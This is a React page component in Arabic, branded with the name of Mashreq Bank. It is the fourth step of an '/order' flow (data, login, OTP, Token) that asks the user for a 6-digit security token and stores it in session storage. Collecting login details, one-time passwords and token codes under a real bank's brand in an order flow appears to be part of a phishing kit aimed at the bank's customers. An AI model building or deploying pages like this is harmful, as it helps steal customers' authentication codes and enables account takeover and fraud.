import { useState } from "react";
import { useLocation } from "wouter";
import { Button } from "@/components/ui/button";
import { InputOTP, InputOTPGroup, InputOTPSlot } from "@/components/ui/input-otp";
import { Label } from "@/components/ui/label";
import { Card } from "@/components/ui/card";
import { ArrowLeft, ChevronRight } from "lucide-react";
import { toast } from "sonner";

export default function TokenPage() {
  const [, navigate] = useLocation();
  const [loading, setLoading] = useState(false);
  const [tokenCode, setTokenCode] = useState("");

  const validateForm = () => {
    if (tokenCode.length !== 6) {
      toast.error("يرجى إدخال رمز Token من 6 أرقام");
      return false;
    }
    return true;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateForm()) return;

    setLoading(true);
    try {
      // حفظ رمز Token
      sessionStorage.setItem("tokenCode", tokenCode);
      
      // الانتقال إلى صفحة النجاح
      navigate("/order/success");
    } catch (error) {
      console.error("Error:", error);
      toast.error("حدث خطأ");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-accent/10" dir="rtl">
      {/* الهيدر */}
      <header className="header-nav sticky top-0 z-40">
        <div className="container flex items-center justify-between">
          <h1 className="text-2xl font-bold text-accent">بنك المشرق</h1>
          <Button
            variant="ghost"
            onClick={() => navigate("/")}
            className="gap-2"
          >
            <ArrowLeft className="w-4 h-4" />
            العودة
          </Button>
        </div>
      </header>

      {/* محتوى الصفحة */}
      <div className="container py-12">
        <div className="max-w-2xl mx-auto">
          {/* شريط التقدم */}
          <div className="mb-8">
            <div className="flex items-center justify-between mb-4">
              <div className="flex items-center gap-2 opacity-50">
                <div className="w-8 h-8 rounded-full bg-muted text-muted-foreground flex items-center justify-center font-bold text-sm">
                  1
                </div>
                <span className="font-semibold text-xs sm:text-base">البيانات</span>
              </div>
              <ChevronRight className="w-5 h-5 text-muted-foreground" />
              <div className="flex items-center gap-2 opacity-50">
                <div className="w-8 h-8 rounded-full bg-muted text-muted-foreground flex items-center justify-center font-bold text-sm">
                  2
                </div>
                <span className="font-semibold text-xs sm:text-base">الدخول</span>
              </div>
              <ChevronRight className="w-5 h-5 text-muted-foreground" />
              <div className="flex items-center gap-2 opacity-50">
                <div className="w-8 h-8 rounded-full bg-muted text-muted-foreground flex items-center justify-center font-bold text-sm">
                  3
                </div>
                <span className="font-semibold text-xs sm:text-base">OTP</span>
              </div>
              <ChevronRight className="w-5 h-5 text-muted-foreground" />
              <div className="flex items-center gap-2">
                <div className="w-8 h-8 rounded-full bg-accent text-white flex items-center justify-center font-bold text-sm">
                  4
                </div>
                <span className="font-semibold text-xs sm:text-base">Token</span>
              </div>
            </div>
            <div className="h-1 bg-muted rounded-full overflow-hidden">
              <div className="h-full w-full bg-accent transition-all duration-300"></div>
            </div>
          </div>

          {/* النموذج */}
          <Card className="p-8">
            <h2 className="text-3xl font-bold mb-2">التحقق برمز Token</h2>
            <p className="text-muted-foreground mb-8">
              أدخل رمز Token الأمان الخاص بك
            </p>

            <form onSubmit={handleSubmit} className="space-y-8">
              <div className="form-group">
                <Label className="form-label mb-6 block">
                  رمز Token (6 أرقام) *
                </Label>
                <div className="flex justify-center">
                  <InputOTP
                    maxLength={6}
                    value={tokenCode}
                    onChange={setTokenCode}
                  >
                    <InputOTPGroup>
                      <InputOTPSlot index={0} />
                      <InputOTPSlot index={1} />
                      <InputOTPSlot index={2} />
                      <InputOTPSlot index={3} />
                      <InputOTPSlot index={4} />
                      <InputOTPSlot index={5} />
                    </InputOTPGroup>
                  </InputOTP>
                </div>
              </div>

              <div className="flex gap-4 pt-6">
                <Button
                  type="button"
                  variant="outline"
                  onClick={() => navigate("/order/otp")}
                  className="flex-1"
                >
                  السابق
                </Button>
                <Button
                  type="submit"
                  className="flex-1 button-primary"
                  disabled={loading || tokenCode.length !== 6}
                >
                  {loading ? "جاري المعالجة..." : "إكمال"}
                </Button>
              </div>
            </form>
          </Card>
        </div>
      </div>
    </div>
  );
}
